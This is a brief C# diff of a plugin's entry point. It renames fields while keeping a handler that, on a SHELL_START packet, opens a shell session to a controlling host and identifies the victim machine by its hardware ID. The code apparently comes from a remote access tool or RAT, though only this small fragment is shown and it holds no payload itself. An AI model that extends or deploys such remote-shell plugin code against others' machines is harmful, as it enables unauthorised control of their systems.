@@ -15,10 +15,10 @@ namespace Plugin
 
         public static void Main(LoadingAPI loadingAPI)
         {
-            switch (loadingAPI.currentPacket.packetType)
+            switch (loadingAPI.CurrentPacket.PacketType)
             {
                 case PacketType.SHELL_START:
-                    clientHandler = new ClientHandler(loadingAPI.host, loadingAPI.key, loadingAPI.baseIp, loadingAPI.HWID, ((StartShellSessionPacket)loadingAPI.currentPacket).isPWS);
+                    clientHandler = new ClientHandler(loadingAPI.Host, loadingAPI.Key, loadingAPI.BaseIp, loadingAPI.HWID, ((StartShellSessionPacket)loadingAPI.CurrentPacket).isPWS);
                     clientHandler.ConnectStart();
                     break;
                 default:
